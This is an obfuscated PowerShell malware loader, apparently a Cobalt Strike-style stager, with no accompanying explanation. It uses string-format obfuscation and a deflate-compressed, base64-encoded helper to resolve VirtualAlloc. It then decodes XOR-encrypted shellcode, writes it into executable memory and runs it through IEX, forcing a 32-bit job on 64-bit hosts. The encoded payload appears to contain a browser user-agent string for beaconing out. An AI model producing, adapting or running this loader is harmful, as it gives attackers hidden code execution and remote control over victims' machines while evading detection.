&("{2}{0}{3}{1}"-f '-St','de','Set',("{0}{1}"-f'ric','tMo')) -Version 2


$DooIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$vasr_safe_native_methods = .( $PshOme[4]+$pSHoMe[30]+'x') (nEW-oBJEcT SYsTEm.io.sTReAMreadER((nEW-oBJEcT  Io.CompresSIOn.dEflaTeSTrEAm([iO.mEmOrYstREaM] [SystEM.cOnVeRt]::froMbAsE64sTRIng('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') ,[io.COmprEssIOn.ComPRESSiONMoDe]::DEcoMPrESS) ),[SYstEm.TExT.EncodING]::AScII) ).REadtOeND()


	${Va`R_`gPA} = ${vASR_Saf`E`_Na`T`iVE_MethODs}.("{2}{1}{0}" -f 'od','h',("{0}{1}"-f 'Get','Met'))."INv`o`Ke"(("{0}{1}{2}{3}" -f("{0}{1}{2}"-f'G','etProcAd','d'),'re','s','s'), [Type[]] @(("{0}{7}{5}{2}{8}{6}{12}{3}{1}{9}{4}{11}{10}"-f 'S','o','e',("{0}{1}{2}" -f 'n','time.In','ter'),("{0}{1}"-f'rvic','e'),'st','R','y','m.','pSe',("{1}{0}{2}" -f 'e','dleR','f'),("{0}{1}" -f's.Ha','n'),'u'), ("{1}{0}" -f 'ing','str')))
	return ${VAR_`g`Pa}."in`V`OKE"(${NU`LL}, @([System.Runtime.InteropServices.HandleRef](.("{3}{1}{0}{2}"-f'j','-Ob','ect','New') ("{7}{5}{6}{8}{9}{4}{3}{0}{1}{10}{2}"-f ("{0}{1}" -f's','.Hand'),'leR','f',("{0}{1}"-f 'vi','ce'),'r','ste','m','Sy',("{3}{1}{2}{0}" -f 'n','Runti','me.I','.'),("{0}{1}"-f'ter','opSe'),'e')((&("{1}{0}{2}" -f("{0}{1}"-f 'w-Ob','j'),'Ne','ect') ("{1}{0}"-f ("{0}{1}" -f 't','Ptr'),'In')), (${va`SR_s`Afe_nAT`ive_M`et`Ho`DS}.("{1}{0}{2}" -f'etM','G',("{1}{0}" -f 'd','etho'))."In`V`oke"(("{2}{1}{0}" -f'e',("{2}{3}{0}{1}" -f 'an','dl','tModule','H'),'Ge')))."INv`OKe"(${nu`Ll}, @(${V`A`R_m`ODULE})))), ${V`AR_P`ROCED`URe}))

}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0SdxwdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDFNnFVEjaDGJCXOwmD7m3SfYQJFr9zw4d6XM39g7LxG+rsLbf/TN14D3ORfOOZuELqurOX8PUCifHCAvRkPrenfZe2Pj1Jn9Cixo3zrIriN2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMSEw0TGAN0Sk1HTFRQA213AxUNERgDdGx0FRcYA3dRSkdGTVcMFQ0TGANhbGpmGhhmbXZwCi4pI7iOfyyUhKbtoQw+rWQAmi9L1Qo69iKui4zqINXZSSBRoN6W+cSyEwXhps5psKYUfJ0jp9lw5b5Wtr5TTJW/hBS60Qdp2F+IedJF+J7wJuBOyH1HV//m10Q6J7pgK64g/8W0muxStXa1jA7XhHWgy4KTIgShXGs6/dRSnmplNLuATfI4RH3UcIGQ7x10gCTf62Hib+FYW6BAHeqMAIuijQZswWj9MjMI4DIWQxu7/PrdL+44QqHfnKTW/FDob1I3A5SsGBmkGspL+R8YDFIjS9OWgXXc9kljSyMzIyNLIyNjI3RLe4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41bGe+DLqt7c3BITDRMNEw0RERQjdDhiWQ==')

for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0x0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $DooIt | wait-job | Receive-Job
}
else {
	IEX $DooIt
}
